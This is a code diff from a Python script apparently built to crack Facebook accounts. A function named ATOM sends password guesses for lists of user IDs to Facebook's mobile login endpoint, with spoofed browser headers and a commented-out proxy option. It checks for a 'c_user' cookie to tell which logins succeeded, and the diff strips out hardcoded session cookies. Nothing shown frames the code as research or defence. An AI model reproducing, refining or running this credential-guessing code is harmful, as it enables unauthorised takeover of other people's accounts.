@@ -126,13 +126,6 @@ def ATOM(uid, pww, total_idz):
             "next": "https://p.facebook.com/login/save-device/",
             "flow": "login_no_pin",
             "pass": pw,}
-            cookies = {
-            'datr': 'ES-iZxg35DqKN--TlZlh4Mwu',
-            'sb': 'ES-iZ0S0Q3TXxuSylCRJGHa3',
-            'ps_l': '1',
-            'ps_n': '1',
-            'fr': '1mMxyHSMiEop9Ml8c.AWVxZRcmWyw-RtLG8l6KA3DZMefXPbxl-XQojg.Bnp1ck..AAA.0.0.Bnucw6.AWWjS9bJZ00',
-            'wd': '867x773',}
             headers = {
             'authority': 'p.facebook.com',
             'method': 'POST',
@@ -160,7 +153,7 @@ def ATOM(uid, pww, total_idz):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'viewport-width': '867',}
-            response = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies=cookies,headers=headers,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
